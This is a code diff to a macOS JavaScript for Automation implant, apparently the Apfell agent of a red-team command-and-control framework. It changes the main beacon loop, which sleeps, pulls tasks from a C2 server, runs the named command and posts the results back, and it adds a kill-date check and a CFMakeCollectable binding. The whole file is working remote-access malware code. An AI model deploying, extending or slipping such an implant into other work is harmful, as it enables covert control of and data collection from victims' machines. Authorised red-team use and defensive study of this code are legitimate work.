@@ -2,6 +2,7 @@
 ObjC.import('Cocoa');
 ObjC.import('Foundation'); //there by default I think, but safe to include anyway
 ObjC.import('stdlib');
+ObjC.bindFunction('CFMakeCollectable', ['id', ['void *'] ]);
 var currentApp = Application.currentApplication();
 currentApp.includeStandardAdditions = true;
 //--------------IMPLANT INFORMATION-----------------------------------
@@ -26,7 +27,7 @@ class agent{
 		this.uuid = "UUID_HERE";
 	}
 }
-apfell = new agent();
+var apfell = new agent();
 //--------------Base C2 INFORMATION----------------------------------------
 class baseC2{
 	//To create your own C2, extend this class and implement the required functions
@@ -122,13 +123,16 @@ base64_encode = function(data){
     var encoded = ns_data.base64EncodedStringWithOptions(0).js;
     return encoded;
 };
-exports = {};  // get stuff ready for initial command listing
+var exports = {};  // get stuff ready for initial command listing
 //-------------COMMANDS_HERE -----------------------
 //console.log("about to load commands");
 var commands_dict = exports;
 var jsimports = "";
 
 //-------------GET IP AND CHECKIN ----------------------------------
+if( $.NSDate.date.compare(C2.kill_date) === $.NSOrderedDescending ){
+  $.NSApplication.sharedApplication.terminate(this);
+}
 for(let i=0; i < apfell.ip.length; i++){
 	let ip = apfell.ip[i];
 	if (ip.includes(".") && ip !== "127.0.0.1"){ // the includes(".") is to make sure we're looking at IPv4
@@ -144,32 +148,33 @@ function sleepWakeUp(){
         $.NSThread.sleepForTimeInterval(C2.gen_sleep_time());
         let output = "";
         let task = C2.getTasking();
+        //console.log(JSON.stringify(task));
         let command = "";
         try{
-            command = ObjC.unwrap(task["command"]);
-            if(command !== "none"){
-                let params = ObjC.unwrap(task["params"]);
-                try{
-                    output = commands_dict[command](task, command, params);
-                }
-                catch(error){
-                    if(error.toString().includes("commands_dict[command] is not a function")){
-                        output = JSON.stringify({"user_output": "Unknown command: " + command, "status": "error", "completed": true});
-                    }
-                    else{
-                        output = JSON.stringify({"user_output": error.toString(), "status": "error", "completed": true});
-                    }
-                }
-                if ((typeof output) == "string"){
-                    output = convert_to_nsdata(output);
-                }
-                C2.postResponse(task, output);
+        	//console.log(JSON.stringify(task));
+        	if(task.length === 0){
+        		continue;
+        	}
+        	task = task[0];
+        	//console.log(JSON.stringify(task));
+            command = task["command"];
+            try{
+                output = commands_dict[command](task, command, task['parameters']);
             }
+            catch(error){
+                if(error.toString().includes("commands_dict[command] is not a function")){
+                    output ={"user_output": "Unknown command: " + command, "status": "error", "completed": true};
+                }
+                else{
+                    output = {"user_output": error.toString(), "status": "error", "completed": true};
+                }
+            }
+            C2.postResponse(task, output);
         }
         catch(error){
-            C2.postResponse(task, convert_to_nsdata(JSON.stringify({"user_output": error.toString(), "status": "error", "completed": true})));
+            C2.postResponse(task, {"user_output": error.toString(), "status": "error", "completed": true});
         }
-        task["command"] = "none"; //reset just in case something goes weird
+        //task["command"] = "none"; //reset just in case something goes weird
     }
 }
 sleepWakeUp();
